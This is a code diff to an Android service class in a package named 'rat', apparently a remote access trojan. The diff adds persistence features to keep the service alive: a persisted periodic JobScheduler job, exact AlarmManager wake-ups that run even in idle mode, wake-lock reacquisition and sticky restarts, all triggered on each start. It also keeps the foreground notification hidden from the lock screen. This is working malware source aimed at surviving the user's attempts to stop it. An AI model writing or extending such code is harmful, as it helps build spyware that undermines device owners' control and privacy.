@@ -1,10 +1,14 @@
 package com.fly0rakoon.rat.services;
 
+import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.app.Service;
+import android.app.job.JobInfo;
+import android.app.job.JobScheduler;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ServiceInfo;
@@ -29,7 +33,10 @@ public class ForegroundService extends Service {
     private static final String TAG = "ForegroundService";
     private static final String CHANNEL_ID = "fly0rakoon_channel";
     private static final int NOTIFICATION_ID = 1337;
-    private static final int RESTART_DELAY = 5000; // 5 seconds
+    private static final int JOB_ID = 12345;
+    private static final int ALARM_REQUEST_CODE = 0;
+    private static final long ALARM_INTERVAL = 10 * 60 * 1000; // 10 minutes
+    private static final long JOB_INTERVAL = 15 * 60 * 1000; // 15 minutes
     
     private ConnectionManager connectionManager;
     private PowerManager.WakeLock wakeLock;
@@ -38,6 +45,7 @@ public class ForegroundService extends Service {
     private boolean isRunning = false;
     private int restartAttempts = 0;
     private static final int MAX_RESTART_ATTEMPTS = 10;
+    private static final int RESTART_DELAY = 5000; // 5 seconds
 
     @Override
     public void onCreate() {
@@ -156,7 +164,7 @@ public class ForegroundService extends Service {
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .setAutoCancel(false)
-            .setVisibility(NotificationCompat.VISIBILITY_SECRET); // Hide on lock screen
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET);
 
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
             builder.setLargeIcon(BitmapFactory.decodeResource(getResources(), 
@@ -233,6 +241,7 @@ public class ForegroundService extends Service {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 Log.d(TAG, "Restarting service...");
                 Intent restartIntent = new Intent(this, ForegroundService.class);
+                restartIntent.setAction("RESTART_SERVICE");
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForegroundService(restartIntent);
                 } else {
@@ -243,18 +252,93 @@ public class ForegroundService extends Service {
             Log.e(TAG, "Max restart attempts reached, giving up");
         }
     }
+
+    // ============= NEW PERSISTENCE METHODS =============
+    
+    private void scheduleJobScheduler() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                ComponentName componentName = new ComponentName(this, JobSchedulerService.class);
+                JobInfo jobInfo = new JobInfo.Builder(JOB_ID, componentName)
+                        .setPeriodic(JOB_INTERVAL)
+                        .setPersisted(true)
+                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
+                        .build();
+                
+                JobScheduler jobScheduler = (JobScheduler) getSystemService(JOB_SCHEDULER_SERVICE);
+                if (jobScheduler != null) {
+                    jobScheduler.schedule(jobInfo);
+                    Log.d(TAG, "JobScheduler scheduled with interval: " + JOB_INTERVAL + "ms");
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Failed to schedule JobScheduler: " + e.getMessage());
+            }
+        } else {
+            Log.d(TAG, "JobScheduler not supported on this Android version");
+        }
+    }
+
+    private void scheduleAlarmManager() {
+        try {
+            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
+            Intent intent = new Intent(this, AlarmReceiver.class);
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                    this, 
+                    ALARM_REQUEST_CODE, 
+                    intent,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            
+            long triggerTime = System.currentTimeMillis() + ALARM_INTERVAL;
+            
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
+                Log.d(TAG, "AlarmManager scheduled with exact+idle at: " + triggerTime);
+            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
+                Log.d(TAG, "AlarmManager scheduled with exact at: " + triggerTime);
+            } else {
+                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerTime, pendingIntent);
+                Log.d(TAG, "AlarmManager scheduled at: " + triggerTime);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to schedule AlarmManager: " + e.getMessage());
+        }
+    }
+
+    // ===================================================
     
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+        Log.d(TAG, "Service starting with flags: " + flags);
+        
         String action = intent != null ? intent.getAction() : null;
         Log.d(TAG, "Service starting with action: " + action + ", flags: " + flags);
 
+        // Handle restart requests
         if (action != null && action.equals("RESTART_SERVICE")) {
             Log.d(TAG, "Restart requested via alarm");
             if (!isRunning || connectionManager == null) {
                 initializeConnectionManager();
             }
         }
+
+        // ===== PERSISTENCE METHODS - ALWAYS RUN ON START =====
+        
+        // Schedule JobScheduler for redundancy
+        scheduleJobScheduler();
+        
+        // Schedule AlarmManager for redundancy
+        scheduleAlarmManager();
+        
+        // Ensure notification channel is created
+        createNotificationChannel();
+        
+        // Also ensure wake lock is held
+        if (wakeLock == null || !wakeLock.isHeld()) {
+            acquireWakeLock();
+        }
+
+        // ====================================================
 
         // This ensures service restarts if killed
         return START_STICKY;
